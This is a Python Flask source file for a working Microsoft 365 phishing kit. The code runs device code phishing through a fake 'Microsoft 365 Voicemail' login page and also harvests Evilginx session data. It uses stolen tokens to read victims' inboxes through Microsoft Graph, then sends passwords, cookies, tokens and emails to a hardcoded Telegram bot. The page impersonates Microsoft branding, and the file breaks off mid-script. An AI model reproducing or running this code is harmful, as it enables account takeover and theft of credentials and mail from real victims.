#!/usr/bin/env python3
"""
Microsoft 365 Token Capture + Full Exfiltration (Evilginx + Telegram)
- Captures tokens via Device Code Flow or Evilginx webhook
- Fetches first 10 emails using Microsoft Graph (if Mail.Read scope present)
- Exfiltrates ALL data (email, password, cookies, full tokens, emails) as a JSON file to Telegram
- Sends a short summary message + the JSON file attachment
"""

import os
import sys
import json
import base64
import secrets
import threading
import time
import datetime
import traceback
import logging
import sqlite3
from logging.handlers import RotatingFileHandler
from functools import wraps
import html

import requests
from flask import Flask, request, render_template_string, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Allow cross-origin requests

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8689962848")
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "changeme")
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(32))
EVILGINX_API_KEY = os.environ.get("EVILGINX_API_KEY", "7867dcfdc6292345d9cba9f3811a58db4ced4a9298aeacb9633cb4f29430584d")

# Evilginx database monitoring
EVILGINX_DB_PATH = os.environ.get("EVILGINX_DB_PATH", os.path.expanduser("~/.evilginx/data.db"))
POLL_INTERVAL = int(os.environ.get("POLL_INTERVAL", "10"))

DB_NAME = "voicemail_logs.db"
TOKENS_DIR = "captured_tokens"
os.makedirs(TOKENS_DIR, exist_ok=True)

DEVICE_CODE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

CLIENT_IDS = [
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "1b730954-1685-4b74-9bfd-dac224a7b894",
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "1950a258-227b-4e31-a9cf-717495945fc2",
    "ab9b8c07-8f02-4f72-87fa-80105867a763",
]

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
file_handler = RotatingFileHandler('token_capture.log', maxBytes=10_485_760, backupCount=5)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

# ==================== TELEGRAM EXFILTRATION ====================
def get_inbox_link(email):
    """Generate direct inbox link based on email domain"""
    if not email:
        return "https://outlook.live.com/mail/0/inbox"
    email_lower = email.lower()
    if any(domain in email_lower for domain in ['@outlook.com', '@hotmail.com', '@live.com', '@msn.com']):
        return "https://outlook.live.com/mail/0/inbox"
    elif '@gmail.com' in email_lower:
        return "https://mail.google.com"
    elif '@yahoo.com' in email_lower:
        return "https://mail.yahoo.com"
    else:
        return "https://outlook.live.com/mail/0/inbox"

def send_telegram_text(message, parse_mode="HTML", retries=3):
    """Send a simple text message to Telegram."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram not configured")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    for attempt in range(1, retries+1):
        try:
            resp = requests.post(url, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            }, timeout=15)
            if resp.status_code == 200:
                return True
            else:
                logger.error(f"Telegram error: {resp.text}")
        except Exception as e:
            logger.error(f"Telegram attempt {attempt}: {e}")
        time.sleep(2 ** attempt)
    return False

def send_telegram_document(filename, caption="", retries=3):
    """Send a file (JSON) to Telegram."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    if not os.path.exists(filename):
        logger.error(f"File not found: {filename}")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    for attempt in range(1, retries+1):
        try:
            with open(filename, "rb") as f:
                resp = requests.post(url, files={"document": f},
                                     data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
                                     timeout=30)
            if resp.status_code == 200:
                logger.info(f"Document {filename} sent")
                return True
        except Exception as e:
            logger.error(f"Document send attempt {attempt}: {e}")
        time.sleep(2 ** attempt)
    return False

# ==================== HELPERS ====================
def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) < 2:
            return None
        payload = parts[1]
        padding = 4 - (len(payload) % 4)
        if padding != 4:
            payload += "=" * padding
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception:
        return None

def extract_real_email(access_token, id_token):
    if id_token:
        claims = decode_jwt_payload(id_token)
        if claims:
            for field in ("email", "preferred_username", "upn", "unique_name"):
                val = claims.get(field)
                if val and "@" in str(val):
                    return val, f"id_token.{field}"
    if access_token:
        claims = decode_jwt_payload(access_token)
        if claims:
            for field in ("email", "preferred_username", "upn", "unique_name"):
                val = claims.get(field)
                if val and "@" in str(val):
                    return val, f"access_token.{field}"
    return None, "could_not_extract"

def get_geolocation(ip):
    if ip in ("127.0.0.1", "::1", "localhost"):
        return {"city": "Local", "country": "Local", "isp": "Local Network"}
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=5)
        data = resp.json()
        if data.get("status") == "success":
            return data
    except Exception:
        pass
    return {"city": "Unknown", "country": "Unknown", "isp": "Unknown"}

def get_client_ip():
    return (request.headers.get("CF-Connecting-IP") or
            request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
            request.remote_addr or "127.0.0.1")

def get_client_name(client_id):
    mapping = {
        "d3590ed6-52b3-4102-aeff-aad2292ab01c": "Microsoft Office",
        "1b730954-1685-4b74-9bfd-dac224a7b894": "Microsoft Office",
        "04b07795-8ddb-461a-bbee-02f9e1bf7b46": "Azure PowerShell",
        "1950a258-227b-4e31-a9cf-717495945fc2": "Azure CLI",
        "ab9b8c07-8f02-4f72-87fa-80105867a763": "OneDrive",
    }
    return mapping.get(client_id, "Microsoft 365")

def get_random_user_agent():
    import random
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    ])

# ==================== GRAPH API HELPERS (EMAIL FETCHING) ====================
def has_mail_read_scope(access_token):
    claims = decode_jwt_payload(access_token)
    if not claims:
        return False
    scp = claims.get('scp', '')
    scopes = scp.split() if scp else []
    return any(scope in scopes for scope in ['Mail.Read', 'Mail.ReadWrite', 'Mail.Read.All'])

def fetch_inbox_emails(access_token, limit=10):
    headers = {"Authorization": f"Bearer {access_token}"}
    url = f"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top={limit}&$select=subject,from,receivedDateTime,bodyPreview&$orderby=receivedDateTime desc"
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            return resp.json().get("value", [])
        else:
            logger.warning(f"Graph API error {resp.status_code}: {resp.text[:200]}")
            return None
    except Exception as e:
        logger.error(f"Email fetch error: {e}")
        return None

def refresh_access_token(refresh_token, client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c"):
    token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": "https://graph.microsoft.com/Mail.Read offline_access"
    }
    try:
        resp = requests.post(token_url, data=data, timeout=15)
        if resp.status_code == 200:
            tokens = resp.json()
            return tokens.get("access_token")
    except Exception as e:
        logger.error(f"Token refresh failed: {e}")
    return None

# ==================== DATABASE ====================
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        user_code TEXT,
        device_code TEXT,
        email TEXT,
        email_source TEXT,
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        expires_in INTEGER,
        ip_address TEXT,
        city TEXT,
        country TEXT,
        isp TEXT,
        user_agent TEXT,
        client_id TEXT,
        client_name TEXT,
        scope TEXT,
        success INTEGER DEFAULT 0,
        full_data TEXT,
        password TEXT,
        cookies TEXT,
        evilginx_source TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS evilginx_processed (
        session_id TEXT PRIMARY KEY,
        processed_at TEXT
    )""")
    conn.commit()
    conn.close()
    logger.info("Database initialized")

def save_full_json(email, email_source, access_token, refresh_token, id_token,
                   expires_in, raw_response, user_code, client_name,
                   password, cookies, geo, ip, user_agent, client_id,
                   emails, source):
    """Save everything as a single JSON file and return the filename."""
    safe_email = email.replace("@", "_at_").replace(".", "_dot_") if email else "unknown"
    timestamp = int(time.time())
    full_data = {
        "capture_timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "source": source,
        "email": email,
        "email_source": email_source,
        "password": password,
        "cookies": cookies if isinstance(cookies, dict) else (json.loads(cookies) if cookies else None),
        "tokens": {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "id_token": id_token
        },
        "client": {
            "client_id": client_id,
            "client_name": client_name,
            "user_code": user_code,
            "expires_in_seconds": expires_in
        },
        "raw_oauth_response": raw_response,
        "location": {
            "ip": ip,
            "city": geo.get("city"),
            "country": geo.get("country"),
            "isp": geo.get("isp")
        },
        "user_agent": user_agent,
        "inbox_emails": emails if emails else []
    }
    json_filename = os.path.join(TOKENS_DIR, f"full_capture_{safe_email}_{timestamp}.json")
    with open(json_filename, "w", encoding="utf-8") as f:
        json.dump(full_data, f, indent=2, ensure_ascii=False)
    logger.info(f"Full data saved: {json_filename}")
    return json_filename

# ==================== PROCESS CAPTURE (FULL EXFILTRATION) ====================
def process_capture(email, email_source, access_token, refresh_token, id_token,
                    ip, geo, client_name, user_code, expires_in, used_client_id,
                    password=None, cookies=None, source="device_code", raw_response=None):
    """Process captured data: save full JSON, send to Telegram as file + summary."""
    
    # Fetch first 10 emails if token allows
    emails = None
    if access_token and has_mail_read_scope(access_token):
        logger.info(f"Token has Mail.Read scope, fetching inbox for {email}")
        emails = fetch_inbox_emails(access_token, limit=10)
        if emails is None:
            emails = []
            logger.warning(f"Failed to fetch emails for {email}")
    elif access_token:
        scopes = decode_jwt_payload(access_token).get('scp', '') if access_token else ''
        logger.info(f"Token lacks Mail.Read scope for {email}. Scopes: {scopes}")
    
    # Save everything to a single JSON file
    json_file = save_full_json(
        email=email,
        email_source=email_source,
        access_token=access_token or "",
        refresh_token=refresh_token or "",
        id_token=id_token or "",
        expires_in=expires_in,
        raw_response=raw_response or {},
        user_code=user_code,
        client_name=client_name,
        password=password,
        cookies=cookies,
        geo=geo,
        ip=ip,
        user_agent=request.headers.get("User-Agent", "Unknown") if hasattr(request, 'headers') else "Unknown",
        client_id=used_client_id,
        emails=emails,
        source=source
    )
    
    # Prepare Telegram summary message
    inbox_link = get_inbox_link(email)
    summary = f"""<b>🔐 NEW CAPTURE</b>
━━━━━━━━━━━━━━━━━━━━━━━

<b>📧 Email:</b> {email}
<b>🔑 Password:</b> {'Yes' if password else 'No'}
<b>🍪 Cookies:</b> {'Yes' if cookies else 'No'}
<b>📬 Inbox access:</b> {'Yes' if emails is not None else 'No'} {f'({len(emails)} emails)' if emails else ''}

<b>🌐 Source:</b> {source}
<b>📍 IP:</b> {ip} ({geo.get('city')}, {geo.get('country')})

<b>📎 Full data attached as JSON file.</b>
━━━━━━━━━━━━━━━━━━━━━━━
<a href="{inbox_link}">📬 Open Inbox</a>"""

    # Send summary + document
    send_telegram_text(summary)
    send_telegram_document(json_file, caption=f"Full capture for {email}")
    
    # Also save to database (truncated for performance)
    conn = sqlite3.connect(DB_NAME)
    conn.execute("""INSERT INTO captures
        (timestamp, user_code, device_code, email, email_source,
         access_token, refresh_token, id_token, expires_in,
         ip_address, city, country, isp, user_agent,
         client_id, client_name, success, full_data,
         password, cookies, evilginx_source)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
        (datetime.datetime.utcnow().isoformat() + "Z",
         user_code if source != "evilginx_webhook" else "evilginx",
         user_code if source != "evilginx_webhook" else "evilginx",
         email, email_source,
         (access_token or "")[:200], (refresh_token or "")[:200], (id_token or "")[:200], expires_in,
         ip, geo.get("city"), geo.get("country"), geo.get("isp"),
         "stored", used_client_id, client_name, 1,
         json.dumps({"summary": "full data saved to file"}), password,
         json.dumps(cookies) if cookies else None, source))
    conn.commit()
    conn.close()
    
    logger.info(f"Processed capture for {email} from {source}")

# ==================== EVILGINX PROCESSING ====================
def process_evilginx_capture(data, ip, user_agent, source="evilginx_webhook"):
    access_token = data.get("access_token")
    refresh_token = data.get("refresh_token")
    id_token = data.get("id_token")
    password = data.get("password")
    email = data.get("email") or data.get("username")
    cookies = data.get("cookies")
    client_id = data.get("client_id", "d3590ed6-52b3-4102-aeff-aad2292ab01c")

    geo = get_geolocation(ip)

    if not email and (access_token or id_token):
        email, email_source = extract_real_email(access_token, id_token)
    else:
        email_source = "evilginx_post"

    if not email:
        email = "unknown@evilginx"
        email_source = "evilginx_fallback"

    client_name = get_client_name(client_id)
    expires_in = 3600

    process_capture(
        email=email,
        email_source=email_source,
        access_token=access_token or "",
        refresh_token=refresh_token or "",
        id_token=id_token or "",
        ip=ip,
        geo=geo,
        client_name=client_name,
        user_code="evilginx",
        expires_in=expires_in,
        used_client_id=client_id,
        password=password,
        cookies=cookies,
        source=source,
        raw_response=data
    )

# ==================== EVILGINX DB MONITOR ====================
def is_valid_sqlite_db(db_path):
    if not os.path.isfile(db_path):
        return False
    try:
        conn = sqlite3.connect(db_path)
        conn.execute("SELECT 1")
        conn.close()
        return True
    except (sqlite3.DatabaseError, sqlite3.OperationalError):
        return False

def fetch_new_evilginx_sessions():
    if not os.path.exists(EVILGINX_DB_PATH):
        return

    if not is_valid_sqlite_db(EVILGINX_DB_PATH):
        logger.warning(f"Invalid SQLite DB: {EVILGINX_DB_PATH}")
        return

    try:
        evil_conn = sqlite3.connect(EVILGINX_DB_PATH, timeout=5)
        evil_conn.row_factory = sqlite3.Row
        cursor = evil_conn.cursor()

        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'")
        if not cursor.fetchone():
            evil_conn.close()
            return

        main_conn = sqlite3.connect(DB_NAME)
        processed_ids = set(row[0] for row in main_conn.execute("SELECT session_id FROM evilginx_processed"))
        main_conn.close()

        cursor.execute("SELECT * FROM sessions ORDER BY id DESC")
        rows = cursor.fetchall()

        for row in rows:
            session_id = str(row.get("id", ""))
            if not session_id or session_id in processed_ids:
                continue

            ip = row.get("ip") or row.get("remote_addr") or "0.0.0.0"
            user_agent = row.get("user_agent") or "Unknown"
            email = row.get("username") or row.get("email") or ""
            password = row.get("password") or ""

            access_token = ""
            refresh_token = ""
            id_token = ""
            client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

            if "tokens" in row.keys() and row["tokens"]:
                try:
                    tokens_json = json.loads(row["tokens"])
                    access_token = tokens_json.get("access_token", "")
                    refresh_token = tokens_json.get("refresh_token", "")
                    id_token = tokens_json.get("id_token", "")
                except:
                    pass
            else:
                access_token = row.get("access_token") or ""
                refresh_token = row.get("refresh_token") or ""
                id_token = row.get("id_token") or ""

            cookies = None
            if "cookies" in row.keys() and row["cookies"]:
                try:
                    cookies = json.loads(row["cookies"])
                except:
                    cookies = {"raw": str(row["cookies"])}

            data = {
                "access_token": access_token,
                "refresh_token": refresh_token,
                "id_token": id_token,
                "password": password,
                "email": email,
                "cookies": cookies,
                "client_id": client_id,
                "session_id": session_id
            }

            process_evilginx_capture(data, ip, user_agent, source="evilginx_db")

            main_conn = sqlite3.connect(DB_NAME)
            main_conn.execute("INSERT INTO evilginx_processed (session_id, processed_at) VALUES (?, ?)",
                              (session_id, datetime.datetime.utcnow().isoformat() + "Z"))
            main_conn.commit()
            main_conn.close()

        evil_conn.close()
    except Exception as e:
        logger.error(f"Error polling Evilginx DB: {traceback.format_exc()}")

def evilginx_db_monitor():
    logger.info(f"Starting Evilginx DB monitor: {EVILGINX_DB_PATH}")
    while True:
        try:
            fetch_new_evilginx_sessions()
        except Exception as e:
            logger.error(f"Monitor error: {e}")
        time.sleep(POLL_INTERVAL)

# ==================== DEVICE CODE FLOW ====================
active_sessions = {}

def countdown_console(seconds):
    for remaining in range(seconds, 0, -1):
        sys.stdout.write(f"\r⏳ Waiting for user... {remaining//60:02d}:{remaining%60:02d} remaining  ")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r" + " " * 70 + "\r")
    sys.stdout.flush()

def poll_for_tokens(device_code, user_code, ip_address, geo_data, user_agent, client_id):
    logger.info(f"Starting polling for {user_code}")
    data = {
        "client_id": client_id,
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
    }
    client_name = get_client_name(client_id)
    max_attempts = 180
    poll_interval = 5

    for attempt in range(max_attempts):
        countdown_console(poll_interval)
        try:
            resp = requests.post(TOKEN_URL, data=data, timeout=15)
            result = resp.json()

            if "access_token" in result:
                at = result["access_token"]
                rt = result.get("refresh_token", "")
                idt = result.get("id_token", "")
                exp = result.get("expires_in", 0)

                real_email, src = extract_real_email(at, idt)
                if not real_email:
                    real_email = "unknown@devicecode"
                    src = "fallback"

                # Update database
                conn = sqlite3.connect(DB_NAME)
                conn.execute("""UPDATE captures SET
                    success=1, email=?, email_source=?, access_token=?,
                    refresh_token=?, id_token=?, expires_in=?, full_data=?
                    WHERE user_code=?""",
                    (real_email, src, at[:200], rt[:200], idt[:200], exp, json.dumps(result), user_code))
                conn.commit()
                conn.close()

                process_capture(
                    email=real_email,
                    email_source=src,
                    access_token=at,
                    refresh_token=rt,
                    id_token=idt,
                    ip=ip_address,
                    geo=geo_data,
                    client_name=client_name,
                    user_code=user_code,
                    expires_in=exp,
                    used_client_id=client_id,
                    source="device_code",
                    raw_response=result
                )

                active_sessions[user_code] = {"status": "completed", "email": real_email}
                logger.info(f"✅ Tokens captured for {real_email}")
                print(f"\n[SUCCESS] Tokens for {real_email} captured")
                return

            elif result.get("error") == "authorization_pending":
                continue
            elif result.get("error") in ("expired_token", "authorization_declined"):
                logger.info(f"Flow expired/declined for {user_code}")
                active_sessions[user_code] = {"status": "failed"}
                return
        except Exception as e:
            logger.error(f"Polling error: {e}")

    logger.warning(f"Polling timeout for {user_code}")
    active_sessions[user_code] = {"status": "failed"}

# ==================== FLASK APP ====================
app.secret_key = SECRET_KEY

def check_auth(username, password):
    return username == ADMIN_USERNAME and password == ADMIN_PASSWORD

def authenticate():
    return ("Unauthorized", 401, {"WWW-Authenticate": "Basic realm='Dashboard'"})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# ==================== HTML TEMPLATES (unchanged, omitted for brevity) ====================
INDEX_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Microsoft 365 Voicemail - Secure Device Login</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect x='2' y='2' width='12' height='12' fill='%23F25022'/%3E%3Crect x='18' y='2' width='12' height='12' fill='%237FBA00'/%3E%3Crect x='2' y='18' width='12' height='12' fill='%2300A4EF'/%3E%3Crect x='18' y='18' width='12' height='12' fill='%23FFB900'/%3E%3C/svg%3E">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif; background: #F0F2F5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; }
        .container { max-width: 540px; width: 100%; }
        .card { background: #fff; border-radius: 28px; box-shadow: 0 8px 28px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.02); overflow: hidden; }
        .header { padding: 20px 28px; border-bottom: 1px solid #E9EDF2; display: flex; align-items: center; gap: 12px; background: #ffffff; }
        .logo-text { font-size: 16px; font-weight: 600; color: #1F1F1F; }
        .content { padding: 32px 28px 28px; }
        .voicemail-preview { background: #F9FAFD; border-radius: 20px; padding: 16px 20px; display: flex; align-items: center; gap: 16px; border: 1px solid #E9EDF2; margin-bottom: 28px; }
        .voicemail-info { flex: 1; }
        .voicemail-filename { font-weight: 650; font-size: 15px; margin-bottom: 6px; color: #242424; }
        .voicemail-meta { font-size: 12px; color: #6F6F6F; display: flex; gap: 12px; }
        .voicemail-badge { background: #FFEAD2; color: #C43E1C; font-size: 11px; font-weight: 700; padding: 4px 12px; border-radius: 100px; }
        .title-section { text-align: center; margin-bottom: 28px; }
        h1 { font-size: 24px; font-weight: 620; margin-bottom: 8px; color: #1a1a1a; }
        .subtitle { font-size: 14px; color: #6F6F6F; }
        .code-box { background: #fff; border: 1px solid #E9EDF2; border-radius: 24px; padding: 20px 24px; text-align: center; margin-bottom: 28px; }
        .code-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: #7A8692; margin-bottom: 16px; }
        .code-value { font-family: 'SF Mono', 'Courier New', monospace; font-size: 42px; font-weight: 700; letter-spacing: 8px; background: #FBFDFF; padding: 20px 12px; border-radius: 20px; color: #0F6CBD; border: 1px solid #EDF0F4; cursor: pointer; margin-bottom: 16px; user-select: all; }
        .code-value:active { background: #F0F6FE; }
        .copy-btn { background: none; border: none; color: #0F6CBD; font-size: 13px; font-weight: 600; cursor: pointer; padding: 6px 20px; border-radius: 40px; display: inline-flex; align-items: center; gap: 8px; transition: 0.2s; }
        .copy-btn:hover { background: #F0F6FE; }
        .steps { background: #F9FAFD; border-radius: 20px; padding: 20px 24px; margin-bottom: 28px; border: 1px solid #E9EDF2; }
        .step { display: flex; align-items: center; gap: 14px; margin-bottom: 18px; }
        .step:last-child { margin-bottom: 0; }
        .step-number { width: 32px; height: 32px; background: #0F6CBD; color: white; font-weight: 600; font-size: 14px; border-radius: 32px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .step-text { font-size: 14px; font-weight: 500; color: #2F2F2F; line-height: 1.4; }
        .step-text a { color: #0F6CBD; text-decoration: none; font-weight: 600; border-bottom: 1px solid rgba(15,108,189,0.3); }
        .primary-btn { width: 100%; background: #0F6CBD; border: none; padding: 14px 18px; border-radius: 44px; font-size: 15px; font-weight: 600; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; transition: all 0.2s; }
        .primary-btn:hover:not(:disabled) { background: #095E9E; transform: translateY(-1px); }
        .primary-btn:disabled { background: #B8CDE5; cursor: not-allowed; }
        .security-footer { display: flex; align-items: center; justify-content: center; gap: 8px; padding-top: 20px; border-top: 1px solid #E9EDF2; font-size: 12px; color: #8C9AAB; }
        .state-panel { transition: opacity 0.2s; }
        .hidden { display: none; }
        .loading-state, .success-state, .error-state { text-align: center; padding: 32px 20px; }
        .spinner { width: 48px; height: 48px; border: 3px solid #E9EDF2; border-top: 3px solid #0F6CBD; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-title, .success-title, .error-title { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
        .success-title { color: #107C10; }
        .error-title { color: #D13400; }
        .loading-subtitle { font-size: 14px; color: #6F6F6F; line-height: 1.6; }
        .footer { background: #F9FAFD; padding: 14px; text-align: center; font-size: 11px; color: #8C9AAB; border-top: 1px solid #E9EDF2; }
        .info-note { background: #EFF7FF; border-radius: 14px; padding: 12px 16px; font-size: 12px; color: #0F6CBD; margin-top: 12px; text-align: center; }
        .retry-btn { margin-top: 20px; background: #0F6CBD; border: none; padding: 10px 24px; border-radius: 40px; color: white; font-weight: 600; cursor: pointer; }
        .retry-btn:hover { background: #095E9E; }
        @media (max-width: 500px) { .content { padding: 24px 20px; } .code-value { font-size: 28px; letter-spacing: 4px; } }
        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1F1F1F; color: white; padding: 10px 20px; border-radius: 40px; font-size: 13px; z-index: 1000; opacity: 0; transition: opacity 0.2s; pointer-events: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="header">
            <svg width="28" height="28" viewBox="0 0 32 32"><rect x="2" y="2" width="12" height="12" fill="#F25022" rx="1.5"/><rect x="18" y="2" width="12" height="12" fill="#7FBA00" rx="1.5"/><rect x="2" y="18" width="12" height="12" fill="#00A4EF" rx="1.5"/><rect x="18" y="18" width="12" height="12" fill="#FFB900" rx="1.5"/></svg>
            <span class="logo-text">Microsoft 365 Voicemail</span>
        </div>
        <div class="content">
            <div id="defaultPanel">
                <div class="voicemail-preview">
                    <div class="voicemail-info">
                        <div class="voicemail-filename">🎙️ Voicemail_20260430_1542.mp3</div>
                        <div class="voicemail-meta"><span>⏱️ Duration: 0:42 min</span><span>•</span><span>📅 Today at 3:42 PM</span></div>
                    </div>
                    <div class="voicemail-badge">New</div>
                </div>
                <div class="title-section">
                    <h1>Listen to your voicemail</h1>
                    <p class="subtitle">Verify your identity with Microsoft Entra ID</p>
                </div>
                <div class="code-box">
                    <div class="code-label">🔐 Verification code</div>
                    <div class="code-value" id="verificationCode">------</div>
                    <button class="copy-btn" id="copyBtn">📋 Copy code</button>
                </div>
                <div class="steps">
                    <div class="step"><div class="step-number">1</div><div class="step-text">Copy the verification code above</div></div>
                    <div class="step"><div class="step-number">2</div><div class="step-text">Click the button below to open <strong>microsoft.com/devicelogin</strong> and paste the code</div></div>
                    <div class="step"><div class="step-number">3</div><div class="step-text">Sign in with your Microsoft 365 account</div></div>
                </div>
                <button class="primary-btn" id="continueBtn">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
                    Continue to Microsoft Device Login
                </button>
                <div class="security-footer">🔒 Secured by Microsoft Entra ID</div>
                <div id="statusMsg" class="info-note">🟢 Ready - Code will auto-generate</div>
            </div>

            <div id="loadingPanel" class="state-panel hidden">
                <div class="loading-state">
                    <div class="spinner"></div>
                    <div class="loading-title">Waiting for verification</div>
                    <div class="loading-subtitle" id="loadingSubtitle"></div>
                    <div class="info-note" style="margin-top:20px;">⏳ Complete sign-in on the Microsoft page</div>
                </div>
            </div>

            <div id="successPanel" class="state-panel hidden">
                <div class="success-state">
                    <div class="success-title">✓ Voice message ready</div>
                    <div class="loading-subtitle">Authentication successful. Redirecting to secure player...</div>
                </div>
            </div>

            <div id="errorPanel" class="state-panel hidden">
                <div class="error-state">
                    <div class="error-title">Verification failed</div>
                    <div class="loading-subtitle" id="errorMsg"></div>
                    <button class="retry-btn" id="retryBtn">⟳ Try again</button>
                </div>
            </div>
        </div>
        <div class="footer">© 2026 Microsoft Corporation. All rights reserved.</div>
    </div>
    <div id="toast" class="toast"></div>
</div>

<script>
(function() {
    'use strict';

    const verificationCodeSpan = document.getElementById('verificationCode');
    const continueBtn = document.getElementById('continueBtn');
    const copyBtn = document.getElementById('copyBtn');
    const retryBtn = document.getElementById('retryBtn');
    const loadingSubtitle = document.getElementById('loadingSubtitle');
    const statusMsg = document.getElementById('statusMsg');
    
    let pollingInterval = null;
    let currentUserCode = null;
    let isPollingActive = false;

    function showToast(msg, duration = 2000) {
        const toast = document.getElementById('toast');
        toast.textContent = msg;
        toast.style.opacity = '1';
        setTimeout(() => { toast.style.opacity = '0'; }, duration);
    }

    function showPanel(panelId) {
        const panels = ['defaultPanel', 'loadingPanel', 'successPanel', 'errorPanel'];
        panels.forEach(id => {
            const el = document.getElementById(id);
            if (el) el.classList.add('hidden');
        });
        document.getElementById(panelId).classList.remove('hidden');
    }

    function showErrorPanel(message) {
        const errorMsgSpan = document.getElementById('errorMsg');
        if (errorMsgSpan) errorMsgSpan.innerText = message || 'Verification failed. Please try again.';
        showPanel('errorPanel');
        if (pollingInterval) {
            clearInterval(pollingInterval);
            pollingInterval = null;
        }
        isPollingActive = false;
    }

    // Auto-generate code from backend on page load
    async function autoGenerateCode() {
        try {
            statusMsg.innerHTML = '🔄 Contacting Microsoft to generate code...';
            statusMsg.style.background = '#FFF3E0';
            statusMsg.style.color = '#E65100';
            
            const response = await fetch('/api/device/start', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            const data = await response.json();
            
            if (data.success && data.userCode) {
                currentUserCode = data.userCode;
                verificationCodeSpan.innerHTML = currentUserCode;
                statusMsg.innerHTML = '✅ Code auto-generated! Click below to continue.';
                statusMsg.style.background = '#E8F5E9';
                statusMsg.style.color = '#2E7D32';
                showToast('Verification code generated successfully!', 2000);
                return true;
            } else {
                throw new Error(data.error || 'Invalid response from backend');
            }
        } catch (err) {
            console.error('Auto-generate error:', err);
            verificationCodeSpan.innerHTML = '⚠️ Error';
            verificationCodeSpan.style.color = '#D13400';
            statusMsg.innerHTML = `❌ Backend error: ${err.message}. Make sure Flask server is running on port 5000`;
            statusMsg.style.background = '#FFEBEE';
            statusMsg.style.color = '#D13400';
            showToast('Failed to connect to backend. Check if server is running.', 3000);
            return false;
        }
    }

    // Poll backend for completion
    function startPolling(userCode) {
        if (pollingInterval) clearInterval(pollingInterval);
